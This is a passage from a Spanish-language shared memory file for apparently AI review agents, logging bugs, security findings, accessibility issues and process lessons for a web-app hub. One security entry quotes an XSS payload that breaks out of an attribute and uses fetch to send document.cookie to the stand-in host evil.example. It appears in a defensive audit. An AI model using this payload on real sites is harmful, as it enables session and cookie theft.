# Memoria compartida del equipo de agentes

Este archivo lo leen y actualizan los 5 agentes de revisión del proyecto (business-analyst, qa-lead, security-reviewer, accessibility-reviewer, release-manager). El objetivo: que lo que un agente descubre no se quede encerrado en su propio archivo (`docs/{app-id}/qa-checklist.md`, `docs/security-notes.md`, etc.) sino que los demás lo vean también.

**Cómo usarlo (para cada agente):**
- Al empezar tu revisión, lee este archivo antes que tu propio archivo de notas — así sabes si otro agente ya encontró algo relevante para lo que vas a revisar.
- Al terminar, si encontraste algo que otro agente debería saber (no solo algo de tu propia especialidad), agrega una entrada corta en "Hallazgos recientes" con fecha, tu rol, y una línea de qué es y por qué importa a los demás. No dupliques aquí el detalle completo — eso vive en tu propio archivo; aquí solo el resumen y el puntero.
- Si un hallazgo tuyo ya no aplica (se corrigió, se descartó), muévelo a "Histórico" en vez de borrarlo.
- Si algo requiere atención urgente del tech lead o del usuario (no puede esperar al próximo ciclo normal — ej. un riesgo de seguridad real, o el proyecto de Supabase a punto de pausarse), ponlo en "⚠️ Requiere atención" en vez de "Hallazgos recientes". El tech lead revisa esa sección primero, siempre.

## ⚠️ Requiere atención

- **2026-08-02 (business-analyst, `hourglass.html`, commit `3c6fa0a`, no bloqueante pero sí corrupción silenciosa de datos sin ningún aviso):** al editar un registro automático de Sueño o Comidas (pestaña Registros → Editar), el campo **Fecha** sigue siendo un `<input type="date">` normal y editable (`hourglass.html:1950`) — a diferencia del selector de **proyecto**, que ya quedó bien bloqueado el mismo día por el fix de `security-reviewer` sobre el caso borde 28. Mover la fecha de un registro de Sueño a un día que ya tiene su propio Sueño generado hace que `indiceFijos()` (línea 887-896) **sume** ambos (14 h de sueño contabilizadas ese día en vez de 7, aunque `blockHoursFrom()` las recorte a un máximo de 24 h), y el día de origen se queda sin su registro, cayendo de vuelta al valor por defecto **sin ningún aviso** de que perdió su corrección puntual. Reproducible con clics normales de la interfaz (Registros → Editar → cambiar Fecha → Guardar), no requiere manipular datos fuera de la UI. No verificado con ejecución real esta sesión (mismo problema de herramienta que otras revisiones de esta app: el clic sobre un control real no tuvo efecto confirmable). Caso borde 32 en `docs/hourglass/requerimientos.md`, con líneas de código exactas. Pendiente de decisión del tech lead/usuaria: el remedio simple y consistente con el fix ya aplicado al proyecto es mostrar la fecha como texto fijo (no editable) cuando se edita un registro de Sueño/Comidas, dejando editables solo hora y nota.

- **2026-07-30 (business-analyst, `hourglass.html`, no bloqueante para este release pero sí pérdida silenciosa de datos con mensaje engañoso):** el botón "⏹ Detener y guardar" de un cronómetro puede no guardar absolutamente nada (si toda la duración quedó dentro de sus propias pausas, `stopTracker()` no empuja ningún registro porque `entry.duracionMin` da 0) **y aun así la app le dice a la usuaria "Cronómetro detenido y guardado como registro."** — un mensaje de éxito falso sobre una pérdida de datos real. El mismo archivo ya maneja bien este mismo caso (0 minutos) en el formulario de registro manual, con un error explícito en vez de un mensaje de éxito falso, así que es una inconsistencia corregible, no una limitación de diseño. Caso borde 14 en `docs/hourglass/requerimientos.md`, con líneas de código exactas. Pendiente de decisión del tech lead/usuaria: al menos avisar cuando "Detener y guardar" no generó ningún registro.

_(el RECHAZADO de security-reviewer del 2026-07-29 sobre `claude/mentor-sesiones-editables-y-checklist` se corrigió en `d73cec7` y se reverificó el mismo día con ejecución real — ver entrada nueva en "Hallazgos recientes" y detalle movido a "Histórico" más abajo. El hallazgo original queda íntegro debajo por trazabilidad, pero ya NO bloquea el merge.)_

- **2026-07-29 (security-reviewer, RECHAZADO real, rama `claude/mentor-sesiones-editables-y-checklist`):** dos hallazgos confirmados con **ejecución real** (DOM auténtico vía `mshta`/`ActiveXObject("htmlfile")`, no solo lectura de código — `node`/`python` siguen ausentes en el `Bash` de esta sesión, pero Windows sí tiene `mshta`/`cscript` con motor JS real, útil para el resto del equipo cuando falte un intérprete). (1) `esc()` (`bitacora-mentor.html:709-713`) escapa `&`/`<`/`>` pero **no comillas** — confirmado con el payload `quote-break" onmouseover="alert(1)` pasando intacto. Es la **única de las 5 apps con este defecto** (`StaffGate.html:1081`, `lpbag.html:1238`, `generador_gantt_2.html:345`, `mytravel-pro-v4.html:1144` sí escapan comillas en su propio `esc()`/`escHtml()`). Esta rama agrega un sitio nuevo (`value="${esc(c.text)}"` en el modal de compromisos) y ensancha uno ya existente (el tema de sesión, antes solo alcanzable fabricando `status:'draft'` a mano, ahora alcanzable para cualquier sesión ya guardada gracias a "editar sesión"). Camino de explotación real, no hipotético: `importBackup()` (`bitacora-mentor.html:2145`) reemplaza el estado completo desde un JSON local sin validar el contenido de cada sesión — un backup con `topic`/`commitments[].text` conteniendo `x" onfocus="fetch('https://evil.example/?c='+document.cookie)" autofocus="1` ejecuta JS arbitrario al abrir "editar" sobre esa sesión, con `window.supabaseClient` ya global. Fix de una línea (agregar el reemplazo de comillas a `esc()`) cierra este sitio y ~18 más en el mismo archivo. (2) `migrarSesiones()` (`bitacora-mentor.html:601-617`, llamada fuera del único `try/catch` de `loadData()`) revienta con `TypeError` no capturado si `state.sessions`/`state.groupSessions` trae un elemento no-objeto (`null`, etc.) — confirmado que `render()` nunca corre después de esa excepción. Misma ruta de origen: `importBackup()` sin validar contenido. **Relevante para todo el equipo, no solo Bitácora:** `importBackup()`/cualquier función de importación de JSON en las 5 apps debería validar el *contenido* de los arreglos que acepta, no solo que sean arreglos — este patrón de "solo valido la forma exterior" puede repetirse en otras apps con import similar. Detalle completo con la salida real de las pruebas en `docs/security-notes.md` ("Revisión 2026-07-29 — rama `claude/mentor-sesiones-editables-y-checklist`") y casos borde 20-21 en `docs/bitacora-mentor/requerimientos.md`. **No corregir en silencio ni fusionar hasta que el tech lead aplique y reverifique ambos fixes**, según la regla de `CLAUDE.md` sobre RECHAZADO.

- **2026-07-29 (security-reviewer, nota de proceso, misma rama):** durante esta revisión el HEAD del worktree avanzó de 3 a 4 commits (`915f2e4`, fix legítimo de un hallazgo de `qa-lead`) y aparecieron cambios sin commitear (ajustes de contraste/`aria-label` de `accessibility-reviewer`) — confirmado con `git log`/`git status` a mitad de tarea, no al final. Mismo patrón de edición concurrente en el mismo worktree ya documentado varias veces abajo. La revisión de seguridad cubrió el estado real encontrado (HEAD + working tree), no solo los 3 commits nombrados al inicio del encargo.

_(el bloqueante de LP-Bag del 2026-07-28 se corrigió y se reverificó el mismo día — ver entrada nueva en "Hallazgos recientes" y el detalle movido a "Histórico" más abajo. El resto de esta sección sigue vigente.)_

- **2026-07-26 (tech lead, PRODUCCIÓN SE MUDÓ — leer antes de verificar cualquier cosa "en producción"):** el sitio ya **no** vive en Netlify. La dirección de producción es **https://lips-hub.lissette2402.workers.dev** (Cloudflare Workers con `[assets]`, configurado en `wrangler.toml`). Netlify sigue conectado al repo unos días como respaldo, así que se actualiza en paralelo y **no** queda atrasado — pero se va a apagar, así que no usarlo como referencia ni mandar ahí al usuario. Tres consecuencias prácticas: (1) **el sitio ya no publica la raíz del repo**, solo lo que `build.sh` copia a `dist/`, así que cualquier archivo nuevo que el sitio necesite hay que agregarlo a `build.sh` o funcionará en local y no en producción; (2) `docs/` y `release-notes/` ya **no** son accesibles por internet — verificado que `/docs/team-memory.md` responde 404 en el sitio nuevo, cosa que en Netlify sí se podía leer; (3) las cuentas nuevas de Cloudflare **ya no ofrecen crear proyectos de Pages**, solo Workers — si alguien documenta pasos de despliegue, que no mande a nadie a buscar Pages. Verificado por la usuaria en vivo: el hub carga, el inicio de sesión funciona con datos reales, y las notas internas dan 404.

- **2026-07-25 (tech lead, para el hilo de `mentor-people` / Bitácora):** midiendo la escena con el navegador encontré que en `bitacora-mentor.html` **ninguna animación llega a instanciarse**: `getComputedStyle` reporta `animation-name: hop-move, hop-squash, hop-mood` y `animation-play-state: running`, pero `element.getAnimations()` devuelve **0** en `.hop-figure`, `.growth-flag` y `.growth-mark`. Comprobado que **ya pasa con el `auth-gate.js` de `master` tal cual** (no lo causó mi rama): las otras escenas en la misma corrida dan 65 (LP-Bag), 39 (Gantt), 40 (StaffGate), 21 (MyTravel) y esa da 0. Puede ser un artefacto de medir con tiempo virtual y animaciones de 30s, o que la escena realmente no se anime en producción — no lo pude distinguir desde aquí. Vale la pena que quien la trabaje lo mire en un navegador real. Y un aviso de método para todos: `animation-play-state` es solo el valor de la propiedad CSS, no dice si la animación existe; el dato real es `getAnimations()`.

- **2026-07-25 (tech lead, `prefers-reduced-motion` ya implementado):** hecho en `auth-gate.js`, cubre las 5 escenas. El hallazgo que importa para el resto del equipo: **el problema era más general que la escena `gantt-build` que se había señalado**. Casi todo elemento animado de las 5 escenas arranca en `opacity:0` **y sus keyframes también terminan en `0`** — son ciclos que aparecen y desaparecen — así que las dos soluciones obvias (`animation:none`, o saltar al estado final con `duration:1ms` + `fill-mode:forwards`) vacían la escena por igual. La única salida es fijar a mano el estado visible de cada elemento. Si alguien agrega una escena nueva, tiene que agregar su propio bloque ahí o quedará invisible con la preferencia activa. Ojo también: la inclinación 3D de la tarjeta la aplica JS con un listener de `mousemove`, no CSS, así que el `@media` no la alcanza — se resolvió no enganchando el listener. Verificado con `--force-prefers-reduced-motion` en las 6 páginas: 0 animaciones corriendo y todas las escenas conservan sus piezas visibles.

- **2026-07-24 (tech lead, para quien trabaje el `prefers-reduced-motion` pendiente):** la escena `coins-rain` ya no tiene una sola animación sino **dos por moneda**: `coin-fall` (la caída, en `.coin-rain`) y `coin-spin` (el giro 3D, en `.coin-3d`). Cualquier bloque de movimiento reducido tiene que cubrir las dos — apagar solo `coin-fall` dejaría las monedas girando en el aire, quietas en su sitio. Ojo también con el detalle que ya estaba anotado para `gantt-build`: un `animation:none` parejo rompe más de lo que calma.

- **2026-07-24 (tech lead, respuesta a los dos hallazgos de teclado de abajo):** ambos **corregidos** en el commit `38f96f1`, **ya fusionado a `master`** por el PR #20 — es decir, **ya están en producción**; la versión anterior de esta nota decía "aún no en producción" y quedó desactualizada al fusionarse el PR. **Ojo:** por esa nota desactualizada el hallazgo del enlace de recuperación se volvió a reportar como pendiente el 2026-07-24 y se re-investigó desde cero — al corregir algo, actualizar también la entrada de "⚠️ Requiere atención" o moverla a "Histórico", no solo el código. (1) El candado ahora marca `inert` en todos los hijos del `<body>` salvo el suyo mientras está visible, y lo revierte al quitarse: el panel de atrás sale del orden de tabulación, del árbol de accesibilidad y de los clics, y el foco arranca en el campo de correo. Un `MutationObserver` cubre lo que las apps agregan después del candado — **el badge de "Conectar carpeta de datos" se escapaba del bloqueo inicial**, y ese badge abre el selector de carpetas con permiso de **escritura**, así que quien toque `auth-gate.js` debe saber que ese elemento aparece tarde. (2) El enlace de recuperación pasó a ser un `<button type="button">` con aspecto de enlace y `:focus-visible`. Verificado en las 5 apps: 0 hijos del body sin `inert`, ningún control de atrás acepta foco ni con `.focus()` directo, y el botón de recuperación cambia de modo al activarse. Esto además cierra por el lado del teclado el riesgo de escritura del Caso borde 6 de LP-Bag. **Sigue sin resolver:** `prefers-reduced-motion` y los contrastes bajo AA.

- **2026-07-24 (accessibility-reviewer, revisión de accesibilidad del PR #18):** dos cosas urgentes. (1) **El PR #18 ya se fusionó a `master`** (commit `61cd68e`, verificado con `git fetch origin`) **antes de que esta revisión de accesibilidad terminara** — si la intención era que la revisión funcionara como gate previo al merge, llegó tarde; ningún hallazgo de esta revisión habría bloqueado el PR en sí (nada de lo nuevo que introduce es un problema nuevo), pero el tech lead debe saber que el flujo de "pedir revisión → esperar → fusionar" no se respetó esta vez. (2) Confirmado en vivo con Playwright (Tab real, no inferencia) que el overlay de login de `auth-gate.js` **no atrapa el foco de teclado** — el panel de la app detrás queda totalmente alcanzable con Tab (25 controles antes de llegar al campo de correo, en una sesión vacía de LP-Bag) — y que el enlace "¿Olvidaste tu contraseña?" (`<a class="toggle-mode">` sin `href`, línea 824) **es inalcanzable por teclado** en cualquiera de las 5 apps, porque el componente es compartido. Ambos son preexistentes (confirmados idénticos en el commit previo al PR #17), no introducidos por el PR #18, pero ya están en producción ahora mismo. Detalle completo, con el método de prueba, en `docs/lpbag/accessibility-notes.md` y `docs/lpbag/requerimientos.md` (Casos borde 12 y 13).

- **2026-07-24 (release-manager, verificación previa al merge del PR #18):** el PR #18 (`claude/lpbag-login-background-cg4med`) y el PR #17 (ya fusionado a `master`) reescribieron **la misma escena `coins-rain`** de `auth-gate.js` de forma independiente, con implementaciones distintas. `git merge-tree` confirma conflictos reales; la API de GitHub confirma `mergeable: false`/`mergeable_state: "dirty"` para el PR #18 — **no se puede fusionar tal cual, necesita rebase/reconciliación manual**. Como `auth-gate.js` es compartido por las 5 apps, cualquier agente/rama activa que también lo esté tocando debe coordinarse antes de avanzar mucho, no solo al momento del PR. Además: no se pudo abrir el deploy preview del PR #18 ni pegarle directo a Supabase desde este entorno — el proxy devolvió `403` para `*.netlify.app` y para `supabase.co` (confirmado en `$HTTPS_PROXY/__agentproxy/status`). Detalle completo en `docs/release-log.md` y `docs/lpbag/requerimientos.md` (Casos borde 10 y 11).

- **2026-07-24 (qa-lead, tercera confirmación independiente):** se me pidió revisar el PR #18 "antes de fusionar a master" — al verificar contra el HEAD real (`git fetch origin`), confirmo lo mismo que ya encontraron release-manager y accessibility-reviewer arriba: **el PR #18 ya está fusionado** (`master` en `61cd68e`, con un commit adicional `41fafdc` encima) y coincide byte a byte con lo que tenía el working tree local (`git diff HEAD origin/master -- auth-gate.js` sin salida), así que toda mi verificación en vivo sigue siendo válida contra lo que hoy está en producción, aunque el encargo asumía que el merge todavía no había pasado. Aparte de esto: durante la sesión encontré el working tree con cambios sin commitear de otro agente (`docs/lpbag/requerimientos.md`, `docs/team-memory.md`, `docs/lpbag/accessibility-notes.md` sin trackear) — edición concurrente real, el mismo patrón de riesgo ya documentado en "Hechos que todo el equipo debe conocer". No toqué esos archivos salvo para anexar mis propias entradas con `Edit` (no sobreescritura). También verifiqué que el conteo de nodos SVG de la escena `coins-rain` **no aumentó** con este cambio (~2900-4400 nodos con el PR, ~4380-4440 con la versión anterior de `master`, en 5 mediciones cada una a 1280px de ancho) — sin riesgo del patrón de explosión de nodos ya visto antes en este proyecto. Encontré un caso borde nuevo (compresión horizontal leve de las monedas en viewports <360px de ancho) — ver `docs/lpbag/requerimientos.md` Caso borde 15. Verificación completa en `docs/lpbag/qa-checklist.md`.

- **2026-07-23 (tech lead, en nombre de business-analyst):** al documentar MyTravel Agent Pro, el agente encontró una **sesión real ya autenticada** en la pestaña de producción (Netlify). No guardó ni modificó nada con ella (evitó crear datos de prueba o cerrar sesión), pero cualquier agente que navegue a la URL de producción durante una revisión debe asumir que puede haber una sesión real activa y evitar escribir/borrar datos con ella salvo que el tech lead lo autorice explícitamente para esa tarea.

- **2026-07-24 (accessibility-reviewer, revisando commit `7e6dac5` de Gantt):** el enlace **"¿Olvidaste tu contraseña?"** (`<a class="toggle-mode">` en `auth-gate.js`, compartido por las 5 apps) **no tiene `href` ni `tabindex` en ningún punto del archivo** — un `<a>` sin `href` no entra en el orden de tabulación por defecto de ningún navegador, así que ese enlace es **inalcanzable por teclado en las 5 apps del hub**, no solo en Gantt. No es una regresión del commit revisado (código preexistente, fuera del diff), pero es el tipo de hallazgo que este rol trata como bloqueante ("control genuinamente inalcanzable por teclado") y afecta a todo el hub por ser código compartido. Fix sugerido: agregar `href="#"` con `preventDefault()` en el listener de clic ya existente, o `tabindex="0"` + manejo de Enter/Espacio. Detalle en `docs/gantt/accessibility-notes.md` y `docs/gantt/requerimientos.md` (caso borde 16).

- **2026-08-04 (accessibility-reviewer, rama `hourglass-ventana-pastilla-siempre-visible`, diff acotado a `hourglass.html` — la pastilla `.pip-mini` de la ventana aparte): APROBADO CON OBSERVACIONES.** Sin gesto real de `documentPictureInPicture` disponible (mismo límite de siempre), pero con cálculo real de contraste WCAG, lectura completa del diff y del código circundante, y un servidor local (`http://localhost:8791/hourglass.html`) que confirmó **0 errores de consola** tras el cambio (descarta una rotura de sintaxis como la del candado el 2026-07-30). **Confirmado por código, relevante para el resto del equipo:** el `prefers-reduced-motion` de `.fp-pill .dot` (ya verificado el 2026-08-02) debería seguir aplicando también dentro del `document` real de la ventana aparte — el mecanismo de copia de estilos (`abrirVentanaFlotante()`, `hourglass.html:2725-2731`) concatena `r.cssText` de cada regla de `document.styleSheets`, y `CSSMediaRule.cssText` incluye el bloque `@media {...}` completo, no solo sus reglas internas — así que se copia íntegro a `pipWin.document.head`. Útil como patrón general: cualquier app que copie estilos a un segundo `document` (PiP, popup, iframe) para reduced-motion no necesita duplicar la regla a mano, el `cssText` ya la arrastra completa. **Dos hallazgos nuevos, ninguno bloqueante:** (1) `.fp-mini-close` (botón nuevo "×" para cerrar la pastilla) mide ≈20×20px de caja CSS calculada, por debajo de WCAG 2.2 SC 2.5.8 (24×24px mínimo) y del propio `.fp-btn` (26×26px) que ya usa el mismo panel — relevante porque la ventana aparte puede abrirse desde una laptop/tablet táctil con Chrome/Edge de escritorio; (2) el más importante — `pintarPip()` reconstruye el `<body>` completo de la ventana aparte con `innerHTML =` en cada `render()` de la app (no solo en cambios de vista), sin guardar/restaurar el foco; este diff amplía mucho la ventana de exposición porque antes la ventana se cerraba al volver a Cronómetros y ahora se queda abierta indefinidamente. No es una trampa de foco, pero sí una pérdida silenciosa de foco cada vez que el DOM se reconstruye debajo de quien esté tabulando dentro de la ventana aparte real. Contraste del botón nuevo, en cambio, pasa cómodo en sus 3 estados (≈5.96:1 reposo, ≈9.16:1 hover, ≈9.2:1 contra el fondo real `#12242A`, calculado con la fórmula de luminancia relativa, no estimado). Sin captura de pantalla real posible otra vez (`screenshot` falló con "the Browser pane is not displayed", mismo patrón crónico de esta app en revisiones anteriores). Detalle completo en `docs/hourglass/accessibility-notes.md` ("Revisión 2026-08-04") y caso borde 42 en `docs/hourglass/requerimientos.md`.

- **2026-08-04 (qa-lead, rama `hourglass-ventana-pastilla-siempre-visible`): APROBADO, con ejecución real que reconfirma independientemente los veredictos de `security-reviewer` (APROBADO) y `accessibility-reviewer` (APROBADO CON OBSERVACIONES) ya anotados arriba para esta misma rama.** Reproduje el caso exacto reportado por la usuaria (quedarse en Cronómetros y cambiar de pestaña del navegador sin tocar nada más) con `visibilityState` real alternado vía `Object.defineProperty`: la ventana ya abierta se expande/colapsa sola, sin pedir una ventana nueva — confirma que el hueco quedó cerrado. También forcé una carrera más agresiva que la probada por el tech lead (mock de `requestWindow()` demorado 200ms + 2 `switchView()` sucesivos en el mismo tick, sin esperar): la ventana llega a abrirse *después* de que la vista ya volvió a Cronómetros y aun así pinta correctamente colapsada, nunca la lista completa encima de la página — los casos 34/35/37/38 (ya cerrados en revisiones anteriores) siguen cerrados. Elevé con ejecución real los dos hallazgos de `accessibility-reviewer` (caso 42): medí `.fp-mini-close` en **20.95×20px reales** (`getBoundingClientRect`, confirma su cifra de ~20×20px, por debajo de 24×24px de WCAG 2.2 SC 2.5.8) y **confirmé la pérdida de foco** al reconstruir el `<body>` de la ventana aparte (enfocar el botón y disparar cualquier `render()` global de la app deja el foco en `BODY`). Ninguno de los dos es bloqueante. Detalle completo en `docs/hourglass/qa-checklist.md` y caso borde 43 de `docs/hourglass/requerimientos.md`. **Aviso de proceso para el resto del equipo, ver también "Hechos" abajo:** durante esta sesión el navegador compartido tenía una pestaña de otra sesión concurrente activa (`tab-3`, proyecto "Truelogic" en Hourglass) y dos de mis llamadas sin `tabId` explícito se ejecutaron ahí por error (una incluyó un `switchView()` real sobre esa sesión ajena, no destructivo pero no solicitado) antes de que lo notara y empezara a fijar `tabId` siempre.

- **2026-08-04 (tech lead):** los dos hallazgos no bloqueantes de `accessibility-reviewer`/`qa-lead` sobre `.fp-mini-close` (objetivo táctil de 20×20px, pérdida de foco al reconstruir la ventana aparte) quedaron **corregidos en la misma rama**, no solo anotados — ver caso borde 44 de `docs/hourglass/requerimientos.md` para el detalle de la corrección y su verificación.

- **2026-08-04 (tech lead, rama `hourglass-pip-icono-nativo-no-bloquea`, bug real reportado por la usuaria en producción horas después de fusionar el caso 40) — lección de proceso para cualquier revisión futura de una ventana Document Picture-in-Picture: el `iframe` que todas las sesiones anteriores (incluida la mía) usaron para simular `pipWin` NO tiene el marco nativo que dibuja el navegador (título, ícono de "volver a la pestaña", X), así que ninguna revisión pudo probar ese ícono — solo cierres iniciados por nuestros propios botones o por `.close()` directo.** Ese ícono nativo (visible en la primera captura que la usuaria compartió al iniciar la conversación sobre este bug) cierra la ventana real igual que la X — mismo `pagehide`, sin ninguna forma de que el código distinga cuál de los dos se usó. El código trataba cualquier `pagehide` no iniciado por nosotros como "cierre a mano", bloqueando la reapertura automática hasta un cronómetro nuevo — pero la usuaria lo usaba solo para asomarse a la pestaña, no para descartar la ventana. Fix: ese `pagehide` ya no marca `pipCerradaAMano`, en su lugar rearma `armarAperturaEnPrimerGesto()` (reutilizada, con guardia `gestoArmado` nueva para no apilar escuchas). **Para la próxima vez que alguien revise una ventana de este tipo con un `iframe` simulado: recordar explícitamente probar también un `pagehide` disparado a mano SIN pasar por el código propio (`ventana.dispatchEvent(new Event('pagehide'))`), que es lo más cercano a simular el marco nativo que el `iframe` no tiene.**

## Hechos que todo el equipo debe conocer

- **2026-08-04 (qa-lead): en un navegador de pruebas compartido, la pestaña "activa"/al frente para `computer`/`javascript_exec` puede cambiar sola a la pestaña de OTRO agente ejecutando en paralelo, no solo a una tuya.** No es solo el riesgo ya conocido de dos hilos editando el mismo archivo — aquí el síntoma fue que llamadas sin `tabId` explícito se ejecutaron contra `tab-3` (otra sesión real, con datos de app distintos a los míos) en vez de mi propia pestaña, incluyendo una que sí tuvo efecto real (un cambio de vista) sobre esa sesión ajena. Mitigación simple: en cuanto `tabs_context` muestre más de una pestaña, fijar `tabId` en **todas** las llamadas de `computer`/`javascript_exec`/`read_page`/`get_page_text` de ahí en adelante, no confiar en "la pestaña activa" por defecto.
- `auth-gate.js` y `supabase-client.js`/`supabase-client-app.js` son compartidos por las 5 apps + el hub — un cambio ahí puede afectar a cualquiera, no solo a la app donde se hizo el cambio.
- El hub (`index.html`) usa un login propio, deliberadamente distinto al de las 5 apps (sin escena decorativa, sin widget de cuenta) — nunca debe tratarse como "una app más" al revisar login.
- Este proyecto ya tuvo un incidente real de dos hilos de Claude Code editando la misma carpeta a la vez sin worktrees, causando que trabajo sin commitear se sobreescribiera silenciosamente (2026-07-23). Si algo revisado no coincide con lo que se esperaba encontrar, considerar esto como causa antes de asumir que es un bug de la app.
- Supabase está en plan gratuito con auto-pausa por inactividad — ver `docs/infra-watch.md` (release-manager) para el estado más reciente.
- **Limitación de herramientas confirmada varias veces esta semana (business-analyst, en bitacora-mentor/staffgate/gantt/mytravel):** el navegador de prueba de esta sesión no tiene forma de guardar capturas de pantalla como archivo `.png` en disco — la herramienta de screenshot solo devuelve la imagen en el chat. Además, en al menos dos apps (`generador_gantt_2.html`, `mytravel-pro-v4.html`) la interactividad real (clics, tecleo) dejó de registrarse después de la carga inicial dentro de la misma sesión de revisión, sin causa clara. Cualquier agente que dependa de verificación visual en vivo debe esperar esto y documentarlo explícitamente en vez de asumir que es un bug de la app bajo revisión.
- **La herramienta de navegador de esta sesión NO puede verificar activación por teclado (tech lead, 2026-07-24).** Sus pulsaciones sintéticas de tecla **sí** llegan a la página (`keydown`/`keyup` con `isTrusted=true` y el `key` correcto) y **sí** mueven el foco con Tab, pero **no disparan la activación por defecto del navegador**: un `<button type="button">` enfocado que recibe Enter **no** emite ningún evento `click`. Verificado con un control limpio — un `<button>` normal creado al vuelo en el light DOM, sin relación con el código del proyecto — así que **no es un bug de la app**. Consecuencia para todo el equipo: "presioné Enter y no pasó nada" con esta herramienta es un **falso negativo**, no un hallazgo. Para confirmar que un control responde, usar `.click()` (prueba el manejador) y comprobar por separado que el elemento es enfocable y alcanzable con Tab; la activación con Enter/Espacio de un `<button>` nativo es comportamiento del navegador, no código de la app. Detalle en `docs/lpbag/accessibility-notes.md` §4.2. Nota aparte: `computer` con `text:"Return"` entregó un `keydown` con `e.key` **vacío**; con `text:"Enter"` el `key` llegó correcto — preferir `"Enter"`. **Salvedad: es una medición única del tech lead, sin segunda opinión** — se lanzó accessibility-reviewer justamente para retarla y el agente murió por límite de sesión antes de opinar (ver `.claude/agent-runs/2026-07-24_2210_accessibility-reviewer.md`). Quien retome esto debería intentar refutarla antes de darla por ley.
- **"Casos borde" es una lista compartida entre los 5 agentes (2026-07-24).** No es exclusiva de business-analyst: qa-lead, security-reviewer, accessibility-reviewer y release-manager también anotan ahí lo que encuentren, en `docs/{app-id}/requerimientos.md`. El tech lead triagea esa lista completa por app (implementado / descartado con razón / pendiente comunicado al usuario) — un caso borde escrito y nunca revisado no cuenta como cubierto.

## Hallazgos recientes

- **2026-08-12 (security-reviewer, commits `8fdcdd5`+`91b3e25`, rama `claude/mentor-crear-otro-grupos-cerrados-y-busqueda`, solo `bitacora-mentor.html` + documentación, sin archivos compartidos): APROBADO CON OBSERVACIONES.** Reemplaza una corrida anterior de `security-reviewer` que murió por límite de sesión sin comunicar veredicto (el análisis ya había quedado escrito en `docs/security-notes.md`, pero sin cerrar); esta corrida lo reverifica y cubre además el commit posterior `91b3e25`. Buscador de 7 campos (`menteeCoincide()`) sin crash con tipos manipulados y sin XSS (término de búsqueda y "Sin resultados para..." pasan por `esc()`, que ya escapa comillas desde el 2026-07-29); `status` de grupo (`groupStatus()`) es imposible de inyectar por diseño (comparación estricta, nunca interpolado crudo). **Hallazgo no bloqueante, sigue pendiente:** `group.closedAt` manipulado a un tipo no-string (objeto/número, vía "Importar copia" sin validar contenido) revienta `renderGroupsView()` sin `try/catch` — pantalla en blanco de toda la app, con la corrupción guardada en la nube antes de que el render que la expone falle. No cruza `user_id`/RLS ni es XSS, es disponibilidad ante datos manipulados a mano. Caso borde 31 en `docs/bitacora-mentor/requerimientos.md`. **Cierre confirmado:** el cerrojo nuevo `guardandoMentee` + `try/finally` (`91b3e25`) sí cierra el bug de doble clic que había quedado abierto en `8fdcdd5` (caso borde 29, ahora CERRADO) — verificado que el `finally` libera la bandera en los 3 caminos posibles (early-return, `return` de "seguir agregando", excepción no capturada), con defensa doble vía `disabled` nativo del botón. Caso borde nuevo (32, menor): "Cancelar" durante un guardado en curso no cancela el guardado ya iniciado. Sin secretos nuevos, sin regresión en `esc()`/checkbox/exportación. Detalle completo en `docs/security-notes.md` ("Revisión 2026-08-12" y su continuación).

- **2026-08-12 (qa-lead, commit `8fdcdd5`, rama `claude/mentor-crear-otro-grupos-cerrados-y-busqueda`, solo `bitacora-mentor.html` + nota de versión, servidor real `http://localhost:8799/`): APROBADO CON OBSERVACIONES.** Las 3 funcionalidades pedidas (casilla "seguir agregando" al crear mentee, grupos cerrados con historial de "Grupos pasados", buscador de mentees ampliado a 7 campos) confirmadas con ejecución real: clics/eventos reales sobre modales reales, cadena de 3 mentees con/sin casilla, cerrar/reabrir grupo por los dos caminos (botón y campo Estado) con `closedAt` sin perderse ni duplicarse al editar sin cambiar el Estado, y — el punto que el tech lead pidió comprobar explícitamente — confirmado que `pendingGroupCommitments()` es independiente de `groupStatus()`, así que un grupo cerrado sigue mostrando sus compromisos pendientes aunque ya no dispare la alerta de inactividad. **Hallazgo nuevo, no bloqueante, relevante para cualquiera que agregue un patrón similar de "mantener el formulario abierto" en cualquier app del hub:** doble clic real en "Guardar mentee" crea un duplicado — bug preexistente (reproducido igual sin la casilla nueva, así que no es una regresión de este commit), pero el propio diseño de "seguir agregando" invita a guardados rápidos y sucesivos, aumentando la probabilidad práctica de disparar ese bug ya existente. Caso borde 29 en `docs/bitacora-mentor/requerimientos.md`. Segundo hallazgo menor: un grupo cerrado sigue permitiendo agregar sesiones nuevas sin aviso — no estaba pedido, posiblemente intencional, pendiente de decisión explícita (caso borde 30). **Cierre de deuda de revisiones anteriores, confirmado con ejecución real:** el caso borde 26 (`.member-check-row` con checkbox estirado a 351-366px, reportado el 2026-08-07) está **cerrado** — el fix de `4140feb` (ya fusionado antes de esta rama) lo corrigió de raíz junto con el bug original; medido en vivo en 13×13px natural, desktop y 375px. El caso borde 7 (grupos sin campo de estado) queda implementado por este mismo commit. Detalle completo en `docs/bitacora-mentor/qa-checklist.md` ("2026-08-12").

- **2026-08-07 (qa-lead, commit `9bf2e86`, rama `claude/mentor-checkbox-y-sobre-el-mentee`, solo `bitacora-mentor.html` + nota de versión, servidor real `http://localhost:8799/`, sin `node`/`python3` disponibles — servidor propio con `System.Net.HttpListener` de PowerShell): APROBADO CON OBSERVACIONES.** Reproduje con ejecución real, cifra por cifra, las 25 comprobaciones que el tech lead dijo haber hecho: geometría antes/después del checkbox (`origin/master`: 260×13px estirado, texto partido en 2 líneas de 32px; HEAD: 13×13px natural, texto 315×16px en una línea — confirmado también a 375px móvil), foco/`disabled`/marcado del checkbox no afectados por el `!important`, y el campo "Sobre el mentee" (crear/editar/vaciar, mentee legado sin la propiedad, payload XSS con comillas confirmado escapado con `hasRealImgTag:false`, exportación CSV/Excel con biblioteca `XLSX` real). **Hallazgo que contradice una premisa del encargo, reportado de forma prominente como pide el protocolo:** `.member-check-row` (checklist de integrantes del modal "Nuevo grupo de mentoría") tiene el MISMO bug exacto que motivó este commit — checkbox estirado a 351-366px de ancho, confirmado en vivo — y **nunca fue corregido ni es nuevo**: confirmado con `diff` que su CSS es byte-idéntico a `origin/master` (preexistente), pero el encargo pedía verificar "que no se hayan afectado" otros sitios con casillas asumiendo que estaban bien, y este nunca lo estuvo. Relevante para cualquiera que audite patrones de checkbox-dentro-de-`.field` en las 5 apps del hub — el mismo tipo de contenedor de formulario genérico puede estar repitiendo este defecto en otros sitios no revisados. Segundo hallazgo, menor, relevante para quien mantenga exportaciones JSON→hoja de cálculo en cualquier app del hub: `XLSX.utils.json_to_sheet` (confirmado con ejecución real) alinea columnas por nombre de propiedad, no por posición — una fila con una 